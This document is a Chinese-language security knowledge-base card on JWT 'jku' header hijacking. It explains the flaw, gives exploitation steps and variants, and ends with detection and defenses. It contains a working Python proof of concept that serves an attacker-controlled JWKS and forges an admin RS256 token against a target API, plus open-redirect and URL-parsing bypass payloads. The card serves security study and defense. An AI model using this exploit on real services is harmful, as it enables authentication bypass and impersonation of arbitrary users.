---
id: web-generic-jwt-jku-header-hijack
title: JWT jku 头劫持：服务端从攻击者 JWKS 取公钥验签
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-jku-header-hijack
tags:
- jwt
- jku
- jwks
- rs256
- header-injection
- authentication-bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:37:28+08:00'
  notes: 已对照原文与图 13-14 核对：服务端直接 requests.get(header.jku)、攻击者托管 JWKS 并用自身私钥 RS256 签名后验签通过、开放重定向/子域/URL 解析差异变体均与原文一致；卡内 `web/generic/open-redirect` 目前无对应卡片（仅有目录），属失效 wikilink，不影响内容；PoC 未在本机执行。
url: /docs/web/generic/jwt/web-generic-jwt-jku-header-hijack/
draft: false
kb_aliases:
- JKU 劫持
- jku 头攻击
- JWKS 伪造
- JWT 公钥替换
- x5u 劫持
---

## 一句话结论

服务端验证 JWT 时直接读取 Header 中的 `jku` 并从该 URL 拉取公钥，且不校验域名时，攻击者把自己的公钥托管到可控 JWKS 端点并用对应私钥签名，即可通过验签冒充任意用户。

## 原理

- `jku`（JWK Set URL）指向一个包含公钥的 JWKS 端点。部分实现会先请求 `jku`，取第一个 key，再用它验证 RS256 签名。
- 该 URL 来自未验证的 JWT Header，完全由攻击者控制。若没有域名白名单/固定配置，攻击者可以让服务端信任自己的公钥。
- 攻击者生成 RSA 密钥对，在自己服务器上提供 `/.well-known/jwks.json`，内容为自己的公钥；用私钥对 `role=admin` 的 Payload 签名，`jku` 指向自己的端点。
- 服务端请求攻击者的 JWKS，得到攻击者公钥，验证攻击者私钥签出的 token，必然通过。根因是“信任了 token 自己声明的密钥来源”。
- `x5u`（X.509 URL）同理，可指向攻击者托管的证书链。

## 触发条件

- 服务端支持 RS256 等非对称算法，并在验证时读取 `jku`/`x5u` 动态获取公钥。
- 没有对 URL 做严格白名单，或白名单可被开放重定向/子域接管/URL 解析差异绕过。
- 攻击者有一个可被目标访问的 HTTPS/HTTP 服务来托管 JWKS。

## 利用步骤

1. 生成攻击者 RSA 密钥对。
2. 启动一个返回 JWKS 的服务，公钥放在 `keys[0]`，`kid` 与 token Header 一致。
3. 用攻击者私钥签发 `{"sub":"admin","role":"admin"}`，Header 带 `jku` 指向攻击者 JWKS、`kid` 对应。
4. 发送到受保护接口，服务端拉取攻击者公钥并验签通过。
5. 若存在域名白名单，尝试开放重定向、子域接管、`@`/Unicode/端口等 URL 解析差异绕过。

## PoC

```python
import jwt, json, requests, threading, time
from flask import Flask, jsonify
from jwt.algorithms import RSAAlgorithm
from cryptography.hazmat.primitives import serialization

atk_private = open("attacker_private.pem").read()
atk_pub = serialization.load_pem_public_key(open("attacker_public.pem", "rb").read())

app = Flask("fake_jwks")

@app.route("/.well-known/jwks.json")
def jwks():
    jwk = json.loads(RSAAlgorithm.to_jwk(atk_pub))
    jwk.update({"kid": "attacker-key", "use": "sig"})
    return jsonify({"keys": [jwk]})

threading.Thread(target=lambda: app.run(port=8888, use_reloader=False), daemon=True).start()
time.sleep(1)

token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    atk_private,
    algorithm="RS256",
    headers={"jku": "http://attacker:8888/.well-known/jwks.json", "kid": "attacker-key"},
)

r = requests.get("http://target/api/admin",
                 headers={"Authorization": f"Bearer {token}"})
print(r.status_code, r.text)
```

## 变体与关联

- 变体：`x5u` 指向攻击者证书；`jwk` 头内嵌公钥（若服务端信任 Header 中的 jwk）；白名单域名存在开放重定向时，用 `https://auth.example.com/redirect?url=http://attacker/...`；子域接管；URL 解析差异（`@`、Unicode、大小写、端口）。
- 关联：[[web-generic-jwt-rs256-hs256-confusion]]（用公钥当 HMAC 密钥）；[[web-generic-jwt-kid-injection]]（通过 kid 控制密钥来源）；`web/generic/open-redirect`（白名单绕过组合）。
- 边界：服务端从固定配置读取公钥、忽略 Header 中的 `jku`/`x5u` 时无效；严格的完整 URL 白名单也能阻断。

## 检测与防御

- 检测：JWT Header 中出现外部 `jku`/`x5u`/内嵌 `jwk`；服务端对外发起 JWKS 请求；请求域名不在已知 IdP 白名单。
- 防御：忽略 Header 中的 `jku`/`x5u`，只从固定配置/JWKS 缓存读取公钥；若必须支持，使用严格完整 URL 白名单并禁止重定向；校验 `kid` 与已知 key 对应；禁用 `jwk` 头内嵌密钥。
